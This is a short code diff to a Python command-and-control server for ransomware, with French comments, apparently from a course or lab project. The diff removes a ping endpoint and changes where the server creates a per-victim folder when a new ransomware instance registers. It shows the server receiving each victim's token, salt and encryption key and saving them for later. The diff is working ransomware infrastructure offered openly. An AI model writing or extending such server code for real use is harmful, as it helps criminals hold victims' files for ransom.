@@ -17,18 +17,13 @@ class CNC(CNCBase):
         with open(path, "wb") as f:
             f.write(bin_data)
 
-    def get_ping(self, path:str, params:dict)->dict:
-        # used to check if cnc is alive
-        print ("ping")
-        return {"status":"Success"}
-
     def post_new(self, path:str, params:dict, body:dict)->dict:
         # used to register new ransomware instance
         token = body["token"] # récupération du token
         salt = body["salt"] # récupération du sel
         key = body["key"] # récupération de la clé
         token_dec = hashlib.sha256(token.encode('utf8')).hexdigest() # dechiffrement du token
-        victim_dir = os.path.join(path, token_dec) # création du chemin du dossier du victime
+        victim_dir = os.path.join(CNC.ROOT_PATH, token_dec) # création du chemin du dossier du victime
         os.mkdir(victim_dir) # création du dossier du victime
 
         # sauvegarde du sel et de la clé dans le dossier du victime
